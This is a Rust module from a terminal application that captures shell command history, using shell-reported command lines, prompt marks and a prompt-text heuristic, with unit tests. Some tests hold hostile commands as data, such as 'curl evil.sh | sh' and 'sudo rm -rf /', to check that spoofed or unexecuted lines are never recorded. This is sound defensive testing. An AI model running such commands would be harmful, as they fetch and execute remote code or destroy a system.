//! Command-history capture: decides, per submitted line of input, whether it
//! was a shell command and what its text was.
//!
//! Three paths, in order of trust:
//!
//! - **In-band** (`OSC 633 ; E`): the shell reports the command line it
//!   actually parsed, so nothing is read off the screen. This is the only
//!   path that works under a multiplexer (inside tmux the app's grid holds
//!   tmux's repaint of every pane, so a vertical split would splice the
//!   neighbouring pane's row into the text), and the only one that cannot
//!   mistake a keystroke for a command. Once a pane sees one `E`, the two
//!   paths below are off for it: they would double-record, and under tmux
//!   the prompt they read may belong to another pane entirely.
//!
//! - **Integrated** (`PromptState::AtPrompt`): input submitted at the prompt
//!   is a command by definition; its text is read back from the grid at the
//!   `PromptEnd` position (so history recall and tab completion come out
//!   right), immediately when the echo is already on screen, or at
//!   `OutputStart` when it isn't yet (paste with a trailing newline). Input
//!   submitted while `Busy` is a running program's stdin, sudo passwords,
//!   `read` answers, and is never recorded. This gate is what makes the
//!   capture safe on integrated hosts: secrets typed mid-command can't
//!   reach the vault by construction.
//!
//! - **Heuristic** (`PromptState::NoIntegration`): the line the cursor sits
//!   on must contain a classic prompt marker (`$ `, `# `, ...), and the text
//!   after the marker must match the input-tracker mirror (proof the input
//!   was echoed, so not a password). A tainted mirror (history recall, tab
//!   completion) trusts the echoed grid text instead. No marker, or no echo,
//!   means no record: this path prefers missing a command over recording a
//!   secret or garbage.
//!
//! Both paths honor the `HISTCONTROL=ignorespace` convention: a command
//! starting with a space is deliberately not recorded.

use crate::state::{InbandCapture, Pane, PendingCapture, PromptState};
use oryxis_terminal::{PositionedShellMark, ShellMark};

/// Upper bound on a recorded command. Anything longer is a paste blob, not a
/// command worth resurfacing in the History tab.
const MAX_COMMAND: usize = 4096;

/// Feed user input `bytes` through the pane's line-editor mirror and return
/// the commands captured by Enter presses inside this write. Call on every
/// user-originated write to the pane's PTY/SSH channel (and only those:
/// programmatic secrets like the sudo-password autofill must bypass this).
pub(crate) fn observe_input(pane: &mut Pane, bytes: &[u8]) -> Vec<String> {
    let lines = pane.input_tracker.feed(bytes);
    if lines.is_empty() {
        return Vec::new();
    }
    // The shell reports its own command lines on this pane: the mirror keeps
    // running (it still tracks what is on the line editor) but nothing is
    // captured from this side, so a keystroke can never be recorded as a
    // command and no command is recorded twice.
    if pane.inband.seen {
        return Vec::new();
    }
    let Ok(term) = pane.terminal.lock() else {
        return Vec::new();
    };
    let mut captured = Vec::new();
    // The grid only reflects state up to the last output batch, so within
    // one write it can vouch for at most one submission; later lines of a
    // multi-line unbracketed paste land after prompts we haven't seen yet
    // (one of them may be a password prompt) and are skipped outright on
    // the heuristic path, or deferred to the mark cycle on the integrated
    // path (where `AtPrompt` consumes itself after the first submit).
    let mut heuristic_done = false;
    for line in lines {
        match pane.prompt {
            PromptState::AtPrompt { abs_line, col } => {
                pane.prompt = PromptState::Busy;
                // Marks can be true while the SCREEN is not: inside tmux
                // the prompt marks ride the passthrough but the grid is
                // tmux's repaint of every pane, so `abs_line` addresses a
                // row that may belong to a neighbour. Reading it is
                // refused at the source too, but the intent belongs here:
                // an integrated host in the alternate screen waits for
                // the shell's own report, it never reads the screen.
                if term.is_alt_screen() {
                    continue;
                }
                match term.logical_line_from_abs(abs_line, col) {
                    Some(text) if !text.trim().is_empty() => {
                        if let Some(cmd) = sanitize_command(&text) {
                            captured.push(cmd);
                        }
                    }
                    // Echo still in flight (paste + newline in one write):
                    // resolve at OutputStart, but only when something was
                    // actually submitted.
                    Some(_) if line.tainted || !line.text.trim().is_empty() => {
                        pane.pending_capture =
                            Some(PendingCapture { b_abs: abs_line, b_col: col });
                    }
                    _ => {}
                }
            }
            PromptState::Busy => {}
            PromptState::NoIntegration => {
                // The classic prompt scan is the only signal on this host,
                // and it is meaningless on the alternate screen (vim, less,
                // a whole tmux session), where what you type is not a
                // command line. The integrated paths above need no such
                // gate: the marks say what is a command, and both grid
                // reads refuse the alternate screen at the source.
                if heuristic_done || term.is_alt_screen() {
                    continue;
                }
                heuristic_done = true;
                let Some(grid_line) = term.cursor_logical_line() else {
                    continue;
                };
                let Some(stripped) = strip_prompt(&grid_line) else {
                    continue;
                };
                let cmd = if line.tainted {
                    // The mirror is unreliable; the echoed grid text is the
                    // best truth available (it shows the recalled/completed
                    // command).
                    stripped.to_string()
                } else if stripped.trim() == line.text.trim() {
                    // Echo check passed: the typed text is on screen, so it
                    // was not an unechoed password.
                    line.text.clone()
                } else {
                    continue;
                };
                if let Some(cmd) = sanitize_command(&cmd) {
                    captured.push(cmd);
                }
            }
        }
    }
    captured
}

/// Apply an output batch's OSC 133 marks to the pane's prompt state and
/// resolve any deferred capture. `term` must be the pane's locked terminal,
/// with the batch already processed, so the grid rows the marks point at are
/// exactly the ones the shell just drew.
pub(crate) fn observe_output_marks(
    pane_prompt: &mut PromptState,
    pending: &mut Option<PendingCapture>,
    inband: &mut InbandCapture,
    term: &oryxis_terminal::TerminalState,
    marks: &[PositionedShellMark],
    texts: &[(u32, String)],
) -> Vec<String> {
    let mut captured = Vec::new();
    for m in marks {
        match m.mark {
            ShellMark::PromptEnd => {
                // A fresh prompt invalidates any unresolved capture: the
                // shell never confirmed a command ran (empty Enter, Ctrl+C).
                *pending = None;
                inband.pending = None;
                *pane_prompt = PromptState::AtPrompt { abs_line: m.abs_line, col: m.col };
            }
            ShellMark::PromptStart => {
                *pending = None;
                inband.pending = None;
                *pane_prompt = PromptState::Busy;
            }
            ShellMark::CommandLine(id) => {
                // The shell parsed a command line. Hold it until the
                // OutputStart that proves it ran, and retire this pane's
                // screen-reading paths for good.
                inband.seen = true;
                inband.pending = texts
                    .iter()
                    .find(|(tid, _)| *tid == id)
                    .map(|(_, text)| text.clone());
                *pending = None;
            }
            ShellMark::OutputStart => {
                // In-band wins: it is the shell's own text, so it needs no
                // echo and no grid. The grid resolution stays for hosts
                // whose integration emits marks but no command line.
                if let Some(text) = inband.pending.take() {
                    if let Some(cmd) = sanitize_command(&text) {
                        captured.push(cmd);
                    }
                    *pending = None;
                } else if let Some(p) = pending.take()
                    && !inband.seen
                    && let Some(text) = term.logical_line_from_abs(p.b_abs, p.b_col)
                    && let Some(cmd) = sanitize_command(&text)
                {
                    captured.push(cmd);
                }
                *pane_prompt = PromptState::Busy;
            }
            ShellMark::CommandEnd(_) => {
                inband.pending = None;
                *pane_prompt = PromptState::Busy;
            }
        }
    }
    captured
}

/// Final gate before a command reaches the vault. Refuses the
/// `HISTCONTROL=ignorespace` convention (leading space = keep out of
/// history), blank lines, paste blobs past [`MAX_COMMAND`] and anything
/// carrying control characters (a healthy grid read never has them).
pub(crate) fn sanitize_command(text: &str) -> Option<String> {
    if text.starts_with(' ') {
        return None;
    }
    let trimmed = text.trim();
    if trimmed.is_empty() || trimmed.len() > MAX_COMMAND {
        return None;
    }
    if trimmed.chars().any(|c| c.is_control() && c != '\t' && c != '\n') {
        return None;
    }
    Some(trimmed.to_string())
}

/// Find the earliest classic prompt terminator in `line` and return what
/// follows it. `None` when the line carries no recognizable prompt, which on
/// the heuristic path means "don't record" (REPLs, raw program prompts).
///
/// A bare `> ` is deliberately NOT a marker: it is bash's PS2 continuation
/// and the prompt of many REPLs (`mysql>`, node's `>`), so accepting it
/// recorded heredoc bodies and REPL input, e.g. secrets typed line by line
/// into `cat > .env <<EOF`, as commands. The one real shell prompt that
/// ends in `> ` is PowerShell's `PS C:\...> `, which announces itself with
/// the leading `PS `, so it is kept behind that gate.
pub(crate) fn strip_prompt(line: &str) -> Option<&str> {
    const MARKERS: [&str; 5] = ["$ ", "# ", "% ", "\u{276f} ", "\u{279c} "];
    let classic = MARKERS
        .iter()
        .filter_map(|m| line.find(m).map(|i| (i, m.len())))
        .min();
    let powershell = if line.starts_with("PS ") {
        line.find("> ").map(|i| (i, "> ".len()))
    } else {
        None
    };
    let (pos, len) = [classic, powershell].into_iter().flatten().min()?;
    Some(&line[pos + len..])
}

/// The AI tool capture's question, in two strengths: is the last line under a
/// command the prompt the shell drew when it finished, or a line of output
/// that merely looks like one? Text alone cannot answer it (`\u{279c}  ~ ` is a
/// prompt, `Progress: 100%` is not, and both are "words then a marker"), so
/// the caller pairs these with the one fact that does discriminate: whether
/// the CURSOR is parked on the line. A shell waiting for input parks it
/// there; a command that printed a line and kept working left it on the row
/// below.
///
/// [`line_could_be_prompt`] is the loose half, safe only behind that gate.
/// [`line_is_bare_prompt`] is the strict half, for when the cursor is
/// somewhere else entirely.
///
/// Neither may use [`strip_prompt`]'s own rule as-is: it takes the EARLIEST
/// marker ANYWHERE in the line, which is right for its job (it reads a line
/// that is prompt + command) and wrong for this one. Under it `# end of file`,
/// the last line of a `cat`, read as "the shell is back", and the capture
/// settled on partial output 800 ms later instead of waiting for the rest.
pub(crate) fn line_could_be_prompt(line: &str) -> bool {
    // The trailing space is gone by the time a grid read returns the line (it
    // ends at the last non-blank cell), so the fresh prompt the shell drew
    // arrives as `admin@db:~$` and has to be matched with the space put back.
    if strip_prompt(line).is_some() || strip_prompt(&format!("{line} ")).is_some() {
        return true;
    }
    // fish's `wilson@box ~> ` carries no marker at all, and neither does any
    // number of custom `PS1`s that end the same way. A BARE `>` stays out,
    // for the reason the rest of this module refuses it: it is bash's default
    // PS2 and node's REPL, so a command left syntactically incomplete would
    // report "completed with no output" for a shell that is in fact waiting
    // for the rest of it. A prompt with a host or a path in front of the `>`
    // is nobody's continuation prompt.
    let trimmed = line.trim_end();
    trimmed.len() > 1 && trimmed.ends_with('>')
}

/// True when `line` is a prompt with nothing typed after it, judged on the
/// text alone: the marker has to END the line. See [`line_could_be_prompt`]
/// for why there are two of these.
pub(crate) fn line_is_bare_prompt(line: &str) -> bool {
    let trimmed = line.trim_end();
    // PowerShell is the one legitimate `>` prompt on this side, gated on the
    // `PS ` prefix exactly as in `strip_prompt`.
    if trimmed.len() > "PS ".len() && trimmed.starts_with("PS ") && trimmed.ends_with('>') {
        return true;
    }
    matches!(
        trimmed.chars().next_back(),
        Some('$' | '#' | '%' | '\u{276f}' | '\u{279c}')
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Drive a real terminal state with `bytes` and run the output-mark pass
    /// over what the sniffer found, exactly as the dispatcher does (process,
    /// drain marks, drain command lines, observe).
    /// The key every `E` below echoes back. Real panes take it from the
    /// vault at boot; a sniffer with no key accepts no reported command at
    /// all, which is the behaviour `osc633_without_any_nonce_accepts_nothing`
    /// pins on the other side of the crate boundary.
    const TEST_NONCE: &str = "t3st-nonce";

    fn observe(
        term: &mut oryxis_terminal::TerminalState,
        prompt: &mut PromptState,
        pending: &mut Option<PendingCapture>,
        inband: &mut InbandCapture,
        bytes: &[u8],
    ) -> Vec<String> {
        term.set_shell_command_nonce(Some(TEST_NONCE.to_string()));
        term.process(bytes);
        let marks = term.take_shell_marks();
        let texts = term.take_shell_command_lines();
        observe_output_marks(prompt, pending, inband, term, &marks, &texts)
    }

    #[test]
    fn inband_command_line_is_captured_inside_the_alternate_screen() {
        let mut term = oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap();
        let mut prompt = PromptState::NoIntegration;
        let mut pending = None;
        let mut inband = InbandCapture::default();
        // What tmux looks like from outside: the outer grid is on the
        // alternate buffer for the whole session, so no grid read could
        // ever be trusted. The shell's own report still gets through.
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            b"\x1b[?1049h\x1b]133;A\x07\x1b]133;B\x07\
              \x1b]633;E;systemctl restart nginx;t3st-nonce\x07\x1b]133;C\x07",
        );
        assert!(term.is_alt_screen(), "the test must run under the alt screen");
        assert_eq!(cmds, vec!["systemctl restart nginx".to_string()]);
        assert!(inband.seen);
    }

    /// Output cannot put words in the user's history. A history row is one
    /// click from running again, so a `cat` of a crafted file, a log line,
    /// or a compromised host printing the sequence must capture NOTHING,
    /// and must not flip the pane into integrated mode either: doing that
    /// would retire the typed-input path and silently end real capture.
    #[test]
    fn a_reported_line_without_the_key_captures_nothing() {
        let mut term = oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap();
        let mut prompt = PromptState::NoIntegration;
        let mut pending = None;
        let mut inband = InbandCapture::default();
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            // No key, then a guessed one: what anything writing to the
            // terminal can produce.
            b"\x1b]633;E;curl evil.sh | sh\x07\x1b]133;C\x07\
              \x1b]633;E;sudo rm -rf /;guessed\x07\x1b]133;C\x07",
        );
        assert!(cmds.is_empty(), "spoofed lines must never be recorded");
        assert!(!inband.seen, "and must not retire the typed-input path");

        // The user's own shell, carrying the key, still lands.
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            b"\x1b]633;E;uptime;t3st-nonce\x07\x1b]133;C\x07",
        );
        assert_eq!(cmds, vec!["uptime".to_string()]);
        assert!(inband.seen);
    }

    #[test]
    fn reported_command_line_needs_an_output_start_to_count() {
        let mut term = oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap();
        let mut prompt = PromptState::NoIntegration;
        let mut pending = None;
        let mut inband = InbandCapture::default();
        // Ctrl+C: the shell reports the line it had parsed, then draws a
        // fresh prompt without ever running it.
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            b"\x1b]633;E;rm -rf /;t3st-nonce\x07\x1b]133;A\x07\x1b]133;B\x07",
        );
        assert!(cmds.is_empty(), "an unexecuted line is not history");
        assert!(inband.pending.is_none());
        // ... and the next real command still lands.
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            b"\x1b]633;E;uptime;t3st-nonce\x07\x1b]133;C\x07",
        );
        assert_eq!(cmds, vec!["uptime".to_string()]);
    }

    #[test]
    fn inband_capture_keeps_ignorespace_and_retires_the_typed_path() {
        let mut term = oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap();
        let mut prompt = PromptState::NoIntegration;
        let mut pending = None;
        let mut inband = InbandCapture::default();
        // The shell reports leading-space commands too, so the
        // HISTCONTROL=ignorespace convention has to be enforced on this
        // path as well.
        let cmds = observe(
            &mut term,
            &mut prompt,
            &mut pending,
            &mut inband,
            b"\x1b]633;E; curl -H 'Authorization: Bearer t0ken' x;t3st-nonce\x07\x1b]133;C\x07",
        );
        assert!(cmds.is_empty(), "leading space = keep out of history");
        assert!(inband.seen, "the pane is integrated even when the line is skipped");

        // Once the shell reports its own lines, the typed-input path stops
        // capturing: it would record every command twice, and under tmux
        // the prompt it reads may belong to a different pane.
        let term = std::sync::Arc::new(std::sync::Mutex::new(
            oryxis_terminal::TerminalState::new_no_pty(80, 24).unwrap(),
        ));
        let mut pane = crate::state::Pane::new("t".into(), term);
        pane.prompt = PromptState::NoIntegration;
        assert_eq!(observe_input(&mut pane, b"echo typed\r").len(), 0);
        pane.inband.seen = true;
        assert!(observe_input(&mut pane, b"echo typed\r").is_empty());
    }

    #[test]
    fn strip_prompt_takes_earliest_marker() {
        // The prompt's `$ ` wins over the one inside the command.
        assert_eq!(
            strip_prompt("wilson@web:~$ echo $ ok"),
            Some("echo $ ok")
        );
        assert_eq!(strip_prompt("root@db:/etc# systemctl restart nginx"), Some("systemctl restart nginx"));
        assert_eq!(strip_prompt("\u{276f} git status"), Some("git status"));
        assert_eq!(strip_prompt("Password:"), None);
        assert_eq!(strip_prompt("Continue? [y/N] y"), None);
    }

    #[test]
    fn strip_prompt_rejects_continuation_and_repl_prompts() {
        // bash PS2 continuation: a heredoc body line (`cat > .env <<EOF`
        // then `DB_PASSWORD=hunter2`) must never qualify as a command.
        assert_eq!(strip_prompt("> DB_PASSWORD=hunter2"), None);
        assert_eq!(strip_prompt("> EOF"), None);
        // REPL prompts ending in `> ` are program input, not shell commands.
        assert_eq!(strip_prompt("mysql> SELECT * FROM users;"), None);
        assert_eq!(strip_prompt("node > 1 + 1"), None);
        // PowerShell is the one legitimate `> ` prompt, gated on `PS `.
        assert_eq!(
            strip_prompt(r"PS C:\Users\wilson> Get-ChildItem"),
            Some("Get-ChildItem")
        );
    }

    /// The loose half, used only where the cursor already says the shell is
    /// waiting. It has to cover the prompts no marker list does, and still
    /// refuse a line of output the cursor happens to be parked on.
    #[test]
    fn a_prompt_under_the_cursor_may_end_on_anything_prompt_shaped() {
        assert!(line_could_be_prompt("admin@db:~$"));
        assert!(line_could_be_prompt("\u{279c}  ~"), "oh-my-zsh ends on the path");
        assert!(line_could_be_prompt("wilson@box ~>"), "fish carries no marker at all");
        // bash's default PS2, left by a command with an unclosed quote. The
        // shell is waiting for the rest of it, so calling that finished would
        // report "completed with no output" for a command still being read.
        assert!(!line_could_be_prompt(">"));
        assert!(!line_could_be_prompt("> "));
        // Output the cursor is sitting on mid-line: a partial write, or a
        // progress line redrawn in place. Neither is a prompt.
        assert!(!line_could_be_prompt("Working..."));
        assert!(!line_could_be_prompt("5eb5b503b376: Downloading 12.4MB/71.9MB"));
        assert!(!line_could_be_prompt(""));
    }

    /// The AI capture's half of the marker question, and the reason it is a
    /// separate function: `strip_prompt` wants the EARLIEST marker (its line
    /// is prompt + command), this one wants the LAST thing on the line to BE
    /// the marker (its line is a prompt with nothing typed after it).
    #[test]
    fn a_bare_prompt_is_the_marker_at_the_end_of_the_line() {
        // The trailing space is gone: a grid read ends at the last non-blank
        // cell, so this is the shape a fresh prompt comes back in.
        assert!(line_is_bare_prompt("admin@db:~$"));
        assert!(line_is_bare_prompt("admin@db:~$ "));
        assert!(line_is_bare_prompt("root@db:/etc#"));
        assert!(line_is_bare_prompt("box%"));
        assert!(line_is_bare_prompt("\u{276f}"));
        assert!(line_is_bare_prompt(r"PS C:\Users\wilson>"));
        // Output that carries a marker is not a prompt, at the end of the
        // line or anywhere in it.
        assert!(!line_is_bare_prompt("# end of file"));
        assert!(!line_is_bare_prompt("/dev/sda1  47G  19G  26G  41% /run/user"));
        assert!(!line_is_bare_prompt("admin@db:~$ tail -f app.log"));
        assert!(!line_is_bare_prompt("export PATH=$PATH:/opt/bin"));
        // And the `> ` prompts that mean program input keep meaning nothing.
        assert!(!line_is_bare_prompt(">"));
        assert!(!line_is_bare_prompt("mysql>"));
        assert!(!line_is_bare_prompt("PS>"), "the gate needs a path after `PS `");
        assert!(!line_is_bare_prompt(""));
    }

    #[test]
    fn sanitize_respects_ignorespace_and_bounds() {
        assert_eq!(sanitize_command("ls -la").as_deref(), Some("ls -la"));
        assert_eq!(sanitize_command("ls -la  ").as_deref(), Some("ls -la"));
        assert!(sanitize_command(" secret --token=x").is_none(), "leading space = ignorespace");
        assert!(sanitize_command("   ").is_none());
        assert!(sanitize_command("").is_none());
        assert!(sanitize_command(&"x".repeat(5000)).is_none());
        assert!(sanitize_command("a\u{7}b").is_none(), "control chars never come from a healthy grid read");
    }
}
